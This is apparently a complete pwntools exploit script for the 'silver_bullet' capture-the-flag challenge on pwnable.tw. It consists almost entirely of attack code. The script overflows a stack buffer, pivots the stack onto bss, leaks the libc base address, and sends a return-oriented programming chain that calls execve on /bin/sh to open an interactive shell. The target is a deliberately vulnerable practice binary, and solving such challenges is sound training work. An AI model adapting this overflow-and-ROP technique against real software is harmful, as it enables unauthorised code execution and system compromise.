#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\x00"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: (int(r, 10) & 0xffffffff) - offset
pad = lambda len=1, c=b'A': c * len

exe = ELF("silver_bullet_patched", checksec=False)
libc = ELF("libc_32.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
# b *0x08048871
# b *0x08048917
b *beat
# b *main+105
set follow-fork-mode parent
set detach-on-fork on
continue
c
finish
c
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.1)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10103
        return remote(host, port)

p = conn()

def create_bullet(desc):
    slan(p, b'choice', 1)
    sa(p, b'of bullet', desc)

def power_up(desc):
    slan(p, b'choice', 2)
    sa(p, b'of bullet', desc)

def beat():
    slan(p, b'choice', 3)

# Stack buffer overflow to pivot stack onto bss (to leak libc)
# and return back to the main loop after winning
create_bullet(pad(47))
power_up(pad())

print("Pivoting stack")
saved_ebp = 0x0804b060
main_loop = 0x08048984
power_up(flat(
    pad(3, b'\xff'),
    saved_ebp,
    main_loop
))

# Buffer overflow on bss for later to pivot stack again and input ROP chain
print("Leaking libc")
beat()
create_bullet(pad(47))
power_up(pad())

read_input = 0x080485f1
saved_ebp = 0x804b058
power_up(flat(
    pad(3),
    saved_ebp,
    read_input,
))

# Leak libc
beat()
ru(p, b'HP : ')
libc.address = leak_dec(rl(p).strip(), libc.symbols['_IO_2_1_stdout_'])
lg("libc base", libc.address)

sleep(1)

# Input rop chain using read_input()
print("ROP")
s(p, flat(
    libc.address + 0x00024bec, # nop ; ret
    libc.address + 0x00023f97, # pop eax ; ret
    0x0b,
    libc.address + 0x00018395, # pop ebx ; ret
    binsh(libc),
    libc.address + 0x000b3eb7, # pop ecx ; ret
    0,
    libc.address + 0x00001aa6, # pop edx ; ret
    0,
    libc.address + 0x00002c87 # int 0x80
))

# Profit
print("Spawning shell")
rr(p, 1)
ia(p)